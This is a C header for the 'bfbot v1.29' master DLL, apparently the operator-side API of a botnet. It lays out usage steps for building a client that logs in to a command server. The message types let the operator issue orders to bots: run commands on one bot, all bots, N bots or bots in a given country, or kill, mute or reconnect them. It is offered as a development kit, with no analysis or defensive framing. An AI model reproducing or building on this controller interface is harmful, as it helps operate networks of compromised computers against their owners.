/*
	bfbot v1.29 master dll header
	Copyright (c) 2008 by iserdo

 use this header to make your own master client
 follow following steps:

 1. your application should call mc_initialize() first
    this function returns socket, which you use later
    in mc_connect_data_s structure
 2. fill mc_connect_data_s structure and call 
    mc_connect() and pass in pointer to the structure
 3. when your application sends data to server, use
    function mc_send()
 4. when your application quits, call function mc_quit()
    to do cleanup; you can also call mc_quit to send
    quit message to server and then call mc_connect()
    again (eg: to make reconnect)
*/


#ifdef MASTERDLL_EXPORTS
#define MASTERDLL_API __declspec(dllexport)
#else
#define MASTERDLL_API __declspec(dllimport)
#endif


/*
 collection of message types possible to receive and/or send,
 some messages are only for sending to server and some are
 only for receiving from server
*/
typedef enum
{
	NONE_ERROR = 0,
	ME_QUIT = 1,
	PEER_JOIN = 2,
	PEER_JOIN_NI = 3,
	PEER_QUIT = 4,
	PEER_TIMEOUT = 5,
	QUERY_TOTAL = 6,
	QUERY_LIST_BASIC = 7,
	QUERY_LIST_ADV = 8,
	ORDER_RECONNECT_USER = 9,
	ORDER_KILL_USER = 10,
	ORDER_MUTE_USER = 11,
	ORDER_QUERY_USER = 12,
	ORDER_COMMAND_USER = 13,
	ORDER_RECONNECT_ALL = 14,
	ORDER_KILL_ALL = 15,
	ORDER_MUTE_ALL = 16,
	ORDER_COMMAND_ALL = 17,
	ORDER_RECONNECT_N = 18,
	ORDER_KILL_N = 19,
	ORDER_COMMAND_N = 20,
	ORDER_COMMAND_COUNTRY = 21,
	SERVER_RESPONSE = 22,
	SERVER_RESTART = 23,
	SERVER_QUIT = 24,
	SERVER_OJ_ADD = 25,
	SERVER_OJ_REMOVE = 26,
	SERVER_OJ_LIST = 27,
	SERVER_OJ_LIST_JOB = 28,
	SERVER_QUERY_INFO = 29,
	SERVER_PEAK_BREACHED = 30,
	CLIENT_TALK = 31,
	SERVER_SVAR_GET = 32,
	SERVER_SVAR_SET = 33
} message_type;


/*
 callback function inside your application that receives message
 from server:
	param1 = type of message (look at message_type enum)
	param2 = pointer to null terminated buffer containing message
	param3 = channel number (0 to 15)
	param4 = pointer to raw data received by server
*/
typedef void (__stdcall *MCRCVCB)(message_type, char *, int, char *);


/*
 possible access type to server
 your application should use VISITOR or MASTER only;
 USER is used for bots
 VISITOR has limited access
*/
typedef enum
{
	NONE = 0,
	USER = 1,
	VISITOR = 2,
	MASTER = 3
} clienttype;


/*
 url structure containing null terminated ip and port number 
*/
typedef struct _url_s
{
	char			*ip;
	unsigned short	port;
} url_s;


/*
 structure contaning callbacks
*/
typedef struct _mc_callbacks_s
{
	void		*mc_rcv_cb;
} mc_callbacks_s;


/*
 connect data structure
 SOCKET sock = put in here returned socket from call to mc_initialize()
 char *host = pointer to null terminated ip address or domain name
 unsigned short port = server port number
 char *code = pointer to null terminated code to login to server
 int code_size = size of code
 clienttype type = access type (look at clienttype enum)
 mc_callbacks_s cbs = structure with callbacks
*/
typedef struct _mc_connect_data_s
{
	SOCKET			sock;
	char			*host;
	unsigned short	port;
	char			*code;
	int				code_size;
	clienttype		type;
	mc_callbacks_s	cbs;
} mc_connect_data_s;


/*
 int mc_initialize()

 Initializes protocol. Must be called before any subsequent call.
 Parameters: None.
 Return value: If function fails, return value is < 0, else return
 value is socket that is used in mc_connect_data_s structure.
*/
MASTERDLL_API int mc_initialize();


/*
 HANDLE mc_connect(mc_connect_data_s *connect_data)

 Connects to server with parameters specified in mc_connect_data_s structure.
 Parameters: 
	mc_connect_data_s *connect_data = [in] pointer to mc_connect_data_s structure
 Return value: If function fails, return value is NULL. This most likely happens when
 application cannot connect to the server specified in mc_connect_data_s structure.
 If function succeeds, return value is handle, which is later used for sending data.
*/
MASTERDLL_API HANDLE mc_connect(mc_connect_data_s *connect_data);


/*
 int mc_send(HANDLE h, message_type type, char *data, int len, url_s *url)

 Sends data to server.
 Parameters:
	HANDLE h = [in] handle return by call to mc_connect
	message_type type = [in] message type (look @ enum of message_type)
	char *data = [in, optional] pointer to data needed to be sent to server
	int len = [in] length of data; if data is NULL, this must be 0
	url_s *url = [in, optional] pointer to url_s structure (used when sending
	to defined user); if this parameter is NULL, forwardable data will be sent
	to all users
 Return value: If function succeeds, return value is 1, else 0.
*/
MASTERDLL_API int mc_send(HANDLE h, message_type type, char *data, int len, url_s *url);


/*
 void mc_quit(HANDLE h)

 Cleanup and closes connection to server.
 Parameters: 
	HANDLE h = [in] handle returned by call to mc_connect
 Return value: None.
*/
MASTERDLL_API void mc_quit(HANDLE h);